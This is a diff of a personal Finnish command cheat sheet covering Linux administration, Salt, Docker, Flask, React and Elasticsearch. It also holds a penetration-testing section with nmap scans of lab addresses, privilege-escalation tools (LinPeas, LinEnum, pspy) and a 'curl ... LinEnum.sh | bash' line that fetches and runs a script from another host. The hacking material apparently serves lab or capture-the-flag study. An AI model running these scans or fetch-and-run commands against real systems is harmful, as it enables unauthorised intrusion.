@@ -24,6 +24,7 @@ ls			<--->	Listaa nykyisen hakemiston tiedostot
 ls -a			<--->	Listaa myos hidden folderit all toiminolla
 ls -l			<--->	Nayttaa tiedostojen oikeudet
 pwd			<--->	Listaa taman hetkisen hakemiston "print working directory"
+exiftool		<--->	libimage-exiftool-perl kertoo tiedoton luonti ajan ja muita tietoja
 
 mkdir kansionnimi	<--->	Luo kansion
 mkdir -p /kansio/kansio	<--->	Luo myos ali kansiot
@@ -69,6 +70,7 @@ ________________________________________________________________________________
 apt-get update			<--->	Paivittaa palvelimelle ohejelmitojen versio tiedot
 apt-get upgrade			<--->	Paivittaa ohjelmistot
 apt-get dist-upgrade		<--->	Kernel paivitykset
+sudo apt autoremove		<--->	Poistaa paketit turhat paketit
 
 apt-cache search ohjelmannimi	<--->	Etsii ohjelmistoja
 apt-get install ohjelmannimi	<--->	Asentaa ohjelmiston
@@ -101,6 +103,7 @@ sudo ufw status vebose				<--->	Tulimuurin status ja verbose luottavassa muodoss
 
 nc -vz ip portti                                <--->   Yhden portin scannaus netcatilla
 netstat -tulpn					<--->   Avoimet portit
+ss -lntpt					<--->	Avoimet portit
 
 ssh user@domain.com				<--->	SSH yhteys default 22 portiin
 
@@ -120,13 +123,13 @@ ________________________________________________________________________________
 apt-get install openssh-client openssh-server	<--->	Open-ssh asennus paketit
 
 hostname -I					<--->	Koneen Ip osoite 4 ja 6
-ssh root@104.248.26.65				<--->	Aluksi yhteys root kayttajalla
+ssh root@external_ip_address			<--->	Aluksi yhteys root kayttajalla
 ssh user@dunttus.com -p 2121			<--->	Jos SSHn portti vaihdettu vaikka 2121
 
 sudo adduser joni				<--->	Luo kayttajan joni
 sudo adduser joni sudo				<--->	Lisaa kayttajalle joni sudo oikeuden
 sudo adduser joni adm				<--->	Lisaa kayttajan joni admineihin
-sudo userdel joni				<--->	Poistaa kayttajan
+sudo userdel joni				<--->	Poistaa kayttajan joni
 
 sudo usermod --lock root			<--->	Lukitsee root salasanan
 etc/ssh/sshd_config				<--->	SSH asetuksin kansio
@@ -134,6 +137,21 @@ sudoedit sshd_config				<--->	PermitRootLogin vaihdetaan taalta "no"
 sudo service ssh restart			<--->	SSH uudelleen käynnistys = asetukset tulee voimaan
 host dunttus.com dnsl.registrar-server.com	<--->	Talla voidaan katsoa hostin tietoja
 sudo a2ensite dunttus-com.conf			<--->	Lisaa tiedoston conf tiedostoon
+
+________________________________________________________________________________________________________________________________
+*** REACT, YARN & NPM ***
+npm --version					<--->	nmp versio tiedot
+node --version					<--->	node.js versio tiedot
+
+npx create-react-app kansion_nimi		<--->	Luo uuden React projektin
+npm install -g create-react-app todolist	<--->	Jos npx ei toimi
+npm -h						<--->	Apua npm komentoihin
+npm start					<--->	Aloittaa nykyisen kansion React projektin
+ctrl + c					<--->	Lopettaa Reacht projektin palvelimen
+
+yarn start					<--->	Aloittaa nykyisen kansion React projektin
+yarn build					<--->	Kokoaa apin staattiseen tiedostoon
+yarn add					<--->	Asentaa ulkoiset paketit yarniin
 
 ________________________________________________________________________________________________________________________________
 *** JULKINEN JA SALAINEN AVAIN ***
@@ -151,14 +169,14 @@ rsync -vazh --progress kansio joni@dunttus.com		<--->	v - komento vastaa h - hum
 
 SCP
 scp "tiedosto" joni@dunttus.com:/home/joni		<--->	Tiedoston siirto scp
-scp -P 2020 -r "tiedosto" joni@104.248.26.65:/home/joni <--->	Tiedon siirto Windows feature bashilta portiin 2020
+scp -P 2020 -r "tiedosto" joni@ip_adress:/home/joni	<--->	Tiedon siirto Windows feature bashilta portiin 2020
 
 GITHUB
 git clone https://github.com/Dunttus/portfolio.git	<--->	Oman git sivun cloonaus linkki
 
 SSHFS
 mkdir /mnt/kansionimi					<--->	Luodaan ensin kansio
-sshfs user@104.248.26.65: /mnt/kansionimi:		<--->   Graaffinen valikointi
+sshfs user@external_ip_adress: /mnt/kansionimi:		<--->   Graaffinen valikointi
 fusermount -u kansio					<--->   Irrottaa mount pointin
 
 ________________________________________________________________________________________________________________________________
@@ -230,7 +248,7 @@ pavahx6Ousoh			<--->	Hyvä alkusalasan on satunainen ja kirjoitetaan muistiin.
 ls -ld salasanat.txt		<--->	Oikeudet salasana teksti tiedostolle
 chmod og-rwx salasanat.txt	<--->	Poistaa oikeudet read write execute
 sudo adduser joni		<--->	Luo käyttäjän joni
-pwgen 12 2			<--->	Generoi 12 merkkin salasanan 2 kertaa
+pwgen 12 2			<--->	Generoi 12-merkkin salasanan 2 kertaa
 
 ________________________________________________________________________________________________________________________________
 *** MARIADB ***
@@ -364,6 +382,17 @@ vagrant ssh                             <--->   Vagrant koneelle paasee ssh yhte
 vagrant destroy                         <--->   Tuhoaa vagrant koneen
 
 ________________________________________________________________________________________________________________________________
+** Flask **
+export FLASK_DEBUG=1			<--->	Run flask in debug mode for auto refresh server
+export FLASK_APP=flasktest.py		<--->	Choose what file you use for flask
+flask run				<--->	Run flask server
+________________________________________________________________________________________________________________________________
+** Docker **
+docker run name				<--->	Ajaa kontin
+docker system prune			<--->	Tuhoaa kaikki kontit, jotka on kiinni
+docker container ls -a			<--->	Listaa kontit
+
+________________________________________________________________________________________________________________________________
 ** SALT WINDOWS **
 salt-master --version                                   <--->   Linux herran Salt masterin versio
 sudo salt '*' cmd.run 'ipconfig' shell=powershell       <--->   Saltin kautta powershell komentoja
@@ -383,7 +412,7 @@ sudo salt 'orja' pkg.purge firefox                      <--->   Paketin remote p
 
 sudo salt -G 'os:windows' pkg.refresh_db                <--->   Salt komento joka kohdennettu windows os
 
-scp -P 2020 -r "tiedosto" joni@104.248.26.65:/home/joni <---> Tiedon siirto Windows feature bashilta portiin 2020
+scp -P 2020 -r "tiedosto" joni@ip_address:/home/joni	<---> Tiedon siirto Windows feature bashilta portiin 2020
 
 SOURCES:
 Pohjana Tero Karvinen 2012: Palvelinten hallinta kurssi, http://terokarvinen.com
@@ -593,13 +622,15 @@ ________________________________________________________________________________
 ip route
 ipcalc 10.0.0.0
 
-nmap -n -vvv 10.10.10.1-254 --top-ports 10 | tee portscan.txt
+nmap -n -vvv 10.10.10.1-254 --top-ports 10 | tee 1portscan.txt
 nmap -n -sV -sC -Pn 10.10.10.10 | tee 10portscan.txt
 nmap -sC -sV -oA tiedostonnimi 10.10.10.10
+nmap -p- -oA tiedostonimi 10.10.10.10
+nmap -T4 -p- -A 10.10.10.10
 
 -sV                                     <--->   Bannerit eli versiotiedot
-loppuun -oA nimi                        <--->   Tekee suoraan tiedostot scannauksien tiedoista
-loppuun -sU                             <--->   UDP
+-oA nimi                        <--->   Tekee suoraan tiedostot scannauksien tiedoista
+-sU                             <--->   UDP
 nmap -n 10.10.10.1-254 -p 80,443        <--->   scannaa ip alueen portit 80 ja 443
 -Pn                                     <--->   no ping
 --top-ports 10                          <--->   Skanna 10 suosituinta porttia
@@ -717,10 +748,16 @@ stty rows 49							<--->	49 tty riveja
 stty cols 185							<--->	185 tty kolumneja
 
 ________________________________________________________________________________________________________________________________
-** LinEnum **
+** PrivEsc **
+LinPeas								<--->	PrivEsc scanneri
+LinEnum								<--->	PrivEsc scanneri
+pspy64s								<--->	CRON job scanneri
 curl 10.10.10.10/LinEnum/LinEnum.sh | bash			<--->	Python http palvelimelta suoraan portti 80
+
 SUID								<--->	root kayttajalla ajettavia ohjelmia
 
+cat /proc/net/tcp						<--->	Nayttaa portit joita palvelin kuuntelee
+int(0x0016)							<--->	Python tulkilla portit oikeaan muotton esim 22ssh = 0016
 ________________________________________________________________________________________________________________________________
 ** privesc **
 uname -a				<--->   Linux versio komento
@@ -749,6 +786,16 @@ ________________________________________________________________________________
 :q!				<--->	Lopetus
 :w!				<--->	Tallennus
 export TERM=screen		<--->	Jos nuolilla ei voi liikkua vimissa
+
+________________________________________________________________________________________________________________________________
+** ElasticSearch **
+curl localhost:9200/_cat/indices?v					<--->	Hakee elasticsearchiin tallenetut indexit
+curl -s localhost:9200/filebeat/_search?size=10000			<--->	Hakee indexin mukaan tiedot max size 10k
+cat filebeat.json | jq							<--->	Json data luettavaan muotoon
+cat filebeat.txt | python -mjson.tool | tee filebeat.txt		<--->	Muuntaa koko teksti tiedoston json muotoon
+grep 'apache' filename.txt > file.json					<--->	Grep filter apache sanalla
+
+Elasticsearchdump							<--->	Githubissa othelma, joka hakee tietoja
 
 ________________________________________________________________________________________________________________________________
 ** WINDOWS **
